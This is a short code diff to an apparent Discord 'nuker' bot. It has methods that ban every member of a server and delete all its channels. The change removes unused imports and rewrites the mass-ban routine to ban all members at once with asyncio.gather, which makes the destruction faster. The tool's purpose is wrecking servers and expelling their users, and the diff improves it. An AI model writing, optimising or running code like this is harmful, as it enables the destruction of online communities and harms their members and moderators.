@@ -1,4 +1,4 @@
-import threading, traceback, datetime, discord, asyncio, ctypes, time
+import traceback, datetime, discord, asyncio
 
 logs = {}
 stops = []
@@ -44,8 +44,7 @@ class DiscordBot(discord.Client):
         await asyncio.sleep(latencyMs)
     async def banAllUser(self, guild:discord.Guild):
         logs[self.logId] += "---- Start AllUserBan ----\n"
-        async for member in guild.fetch_members():
-            await self.banUser(member)
+        await asyncio.gather(*(self.banUser(member) for member in guild.members))
         logs[self.logId] += "---- End ----\n\n\n"
     async def deleteAllChannel(self, guild:discord.Guild):
         logs[self.logId] += "---- Start AllChannelDelete ----\n"
